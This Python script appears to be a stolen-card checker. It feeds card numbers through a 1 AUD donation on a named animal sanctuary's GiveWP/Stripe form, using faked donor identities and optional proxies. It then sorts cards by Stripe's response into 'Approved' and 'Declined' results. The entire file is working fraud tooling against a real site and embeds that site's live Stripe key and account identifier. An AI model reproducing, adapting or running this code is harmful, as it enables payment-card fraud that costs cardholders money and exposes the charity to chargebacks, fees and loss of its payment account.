import requests, uuid
from faker import Faker

faker = Faker('en_US')

def run(card, proxy=None):
    try:
        cc, mm, yy, cvv = card.split("|")
    except:
        return {"status": "declined", "message": "Invalid card format (cc|mm|yy|cvv)"}

    guid = str(uuid.uuid4())
    sid = str(uuid.uuid4())
    muid = str(uuid.uuid4())
    email = faker.email()
    name = faker.name()
    first, last = name.split()[0], name.split()[-1]

    session = requests.Session()
    if proxy:
        session.proxies.update({
            "http": f"http://{proxy}",
            "https": f"http://{proxy}"
        })

    try:
        # STEP 1: Donation request to get client_secret
        headers1 = {
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://kangaroosanctuary.com',
            'priority': 'u=1, i',
            'referer': 'https://kangaroosanctuary.com/?givewp-route=donation-form-view&form-id=8744&locale=en_AU',
            'sec-ch-ua': '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
        }

        params = {
            'givewp-route': 'donate',
            'givewp-route-signature': 'f979804874fcaf77a93acf070de4dd37',
            'givewp-route-signature-id': 'givewp-donate',
            'givewp-route-signature-expiration': '1746357525',
        }

        cookies = {
            '__stripe_mid': guid,
            '__stripe_sid': sid,
        }

        data1 = {
            'amount': '1',
            'currency': 'AUD',
            'donationType': 'single',
            'subscriptionPeriod': 'one-time',
            'subscriptionFrequency': '1',
            'subscriptionInstallments': '0',
            'formId': '8744',
            'enableTribute': 'show',
            'tributeType': 'In honor of',
            'tributesSendNotification': 'send',
            'gatewayId': 'stripe_payment_element',
            'firstName': 'jyrgtfhyy',
            'lastName': 'tbrfgxcvb',
            'email': 'BridgetSchultz1241@gmail.com',
            'anonymous': 'false',
            'tributeFirstName': 'jyrgtfhyy',
            'tributeLastName': 'tbrfgxcvb',
            'tributeRecipientFirstName': 'jyrgtfhyy',
            'tributeRecipientLastName': 'tbrfgxcvb',
            'tributesNotificationEmail': 'brigdetschuk@gmail.com',
            'tributesNotificationMessage': '',
            'donationBirthday': '',
            'originUrl': 'https://kangaroosanctuary.com/donate/',
            'isEmbed': 'true',
            'embedId': 'give-form-shortcode-1',
            'locale': 'en_AU',
            'gatewayData[stripePaymentMethod]': 'card',
            'gatewayData[stripePaymentMethodIsCreditCard]': 'true',
            'gatewayData[formId]': '8744',
            'gatewayData[stripeKey]': 'pk_live_51QMjHxHb39nwWwn7SJNOoEBQubrdyfh3wpriVFqGytkOZRcGbkeD66fErQtL7lsh9bY3Yi1ONwfaDTRtvqBZEFPG00FjWKbDB9',
            'gatewayData[stripeConnectedAccountId]': 'acct_1QMjHxHb39nwWwn7',
        }

        res1 = session.post("https://kangaroosanctuary.com/", params=params, headers=headers1, cookies=cookies, data=data1)
        json_data = res1.json()

        if 'data' not in json_data or 'clientSecret' not in json_data['data']:
            return {"status": "declined", "message": "clientSecret not found in donation response"}

        cl1 = json_data['data']['clientSecret']
        cl2 = cl1.split('_secret_')[0]

        # STEP 2: Confirm the charge on Stripe
        headers2 = {
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'priority': 'u=1, i',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
        }

        data2 = f'return_url=https%3A%2F%2Fkangaroosanctuary.com%2Fdonate%2F%3Fgivewp-event%3Ddonation-completed%26givewp-listener%3Dshow-donation-confirmation-receipt%26givewp-receipt-id%3D559458cd35af2769d698376898305b19%26givewp-embed-id%3Dgive-form-shortcode-1&payment_method_data[billing_details][name]=jyrgtfhyy+tbrfgxcvb&payment_method_data[billing_details][email]=BridgetSchultz1241%40gmail.com&payment_method_data[billing_details][address][country]=IN&payment_method_data[type]=card&payment_method_data[card][number]={cc}&payment_method_data[card][cvc]={cvv}&payment_method_data[card][exp_year]={yy}&payment_method_data[card][exp_month]={mm}&payment_method_data[allow_redisplay]=unspecified&payment_method_data[payment_user_agent]=stripe.js%2Fca98f11090%3B+stripe-js-v3%2Fca98f11090%3B+payment-element%3B+deferred-intent%3B+autopm&payment_method_data[referrer]=https%3A%2F%2Fkangaroosanctuary.com&payment_method_data[time_on_page]=1043066&payment_method_data[client_attribution_metadata][client_session_id]=b4ad9f52-6468-4823-9ff8-5d4fde355f1e&payment_method_data[client_attribution_metadata][merchant_integration_source]=elements&payment_method_data[client_attribution_metadata][merchant_integration_subtype]=payment-element&payment_method_data[client_attribution_metadata][merchant_integration_version]=2021&payment_method_data[client_attribution_metadata][payment_intent_creation_flow]=deferred&payment_method_data[client_attribution_metadata][payment_method_selection_flow]=automatic&payment_method_data[guid]={guid}&payment_method_data[muid]={muid}&payment_method_data[sid]={sid}&expected_payment_method_type=card&client_context[currency]=aud&client_context[mode]=payment&use_stripe_sdk=true&key=pk_live_51QMjHxHb39nwWwn7SJNOoEBQubrdyfh3wpriVFqGytkOZRcGbkeD66fErQtL7lsh9bY3Yi1ONwfaDTRtvqBZEFPG00FjWKbDB9&_stripe_account=acct_1QMjHxHb39nwWwn7&client_secret={cl1}'

        res2 = session.post(f"https://api.stripe.com/v1/payment_intents/{cl2}/confirm", headers=headers2, data=data2)
        res_json = res2.json()

        if 'error' in res_json:
            return {"status": "declined", "message": res_json['error'].get('message', 'Unknown error')}

        stripe_status = res_json.get('status', '')
        if stripe_status == "succeeded":
            return {"status": "Approved", "message": "Charged Successfully ✅"}
        elif stripe_status == "requires_action":
            return {"status": "declined", "message": "3D Secure / VBV Required ⚠️"}
        elif stripe_status == "requires_payment_method":
            return {"status": "declined", "message": "Card Declined ❌"}
        elif stripe_status == "processing":
            return {"status": "pending", "message": "Payment Processing... ⏳"}
        else:
            return {"status": "declined", "message": f"Unhandled Stripe status: {stripe_status}"}

    except Exception as e:
        return {"status": "declined", "message": f"Charge step failed: {str(e)}"}
